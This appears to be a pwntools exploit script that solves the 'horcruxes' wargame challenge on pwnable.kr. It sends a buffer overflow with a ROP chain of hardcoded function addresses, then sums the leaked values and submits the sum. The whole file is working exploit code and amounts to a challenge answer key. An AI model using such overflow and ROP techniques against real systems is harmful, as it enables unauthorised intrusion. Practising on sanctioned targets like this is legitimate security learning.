from pwn import *

def send(p, message):
    print(f'[*] {message}')
    p.sendline(message)


def recv_exp(p):
    message = p.recvline().decode()
    print(f'[*] {message}')
    num = message.split('+')[1]
    return int(num[:-2])


payload = cyclic(116)
payload += p32(0x0809fffc) # Adress of CALL ropme in main
payload += p32(0x0809fe4b) # Address of: A() - 0x0809fe4b
payload += p32(0x0809fe6a) # Address of: B() - 0x0809fe6a
payload += p32(0x0809fe89) # Address of: C() - 0x0809fe89
payload += p32(0x0809fea8) # Address of: D() - 0x0809fea8
payload += p32(0x0809fec7) # Address of: E() - 0x0809fec7
payload += p32(0x0809fee6) # Address of: F() - 0x0809fee6
payload += p32(0x0809ff05) # Address of: G() - 0x0809ff05
payload += p32(0x0809fffc)


p = remote('pwnable.kr', 9032)
print(p.recv().decode())
print(p.recv().decode())
send(p, '1')
print(p.recv().decode())
send(p, payload)
print(p.recvline().decode())

sum = recv_exp(p)
sum += recv_exp(p)
sum += recv_exp(p)
sum += recv_exp(p)
sum += recv_exp(p)
sum += recv_exp(p)
sum += recv_exp(p)
print(f"[+] sum: {sum}")
print(p.recv().decode())
send(p, '1')
print(p.recv().decode())
send(p, str(sum))
print(p.recv().decode())
print(p.recv().decode())

